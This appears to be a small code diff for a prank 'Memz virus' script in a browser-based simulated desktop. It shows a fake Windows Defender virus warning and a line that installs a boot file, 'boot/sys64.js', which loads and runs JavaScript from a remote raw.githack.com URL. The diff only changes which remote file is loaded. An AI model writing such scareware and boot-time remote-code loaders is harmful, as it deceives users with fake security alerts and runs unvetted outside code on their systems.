@@ -128,6 +128,6 @@ $notif('Windows Defender has detected a Virus on your system. Press reboot to co
 
 $alert.info('Virus detected')
 //Memz virus made possible by mkm or mkmhome
-$db.set('boot/sys64.js', '$loader.script("https://raw.githack.com/mhmmkm/Memz-virus-v6/main/Code.js")')
+$db.set('boot/sys64.js', '$loader.script("https://raw.githack.com/mhmmkm/Memz-virus-v6/main/MemzVirus.js")')
 $store.set('desktop/meme.txt', 'hello world');
 $audio('/c/programs/crazyError/CRAZY-ERROR-170BPM.wav').play()
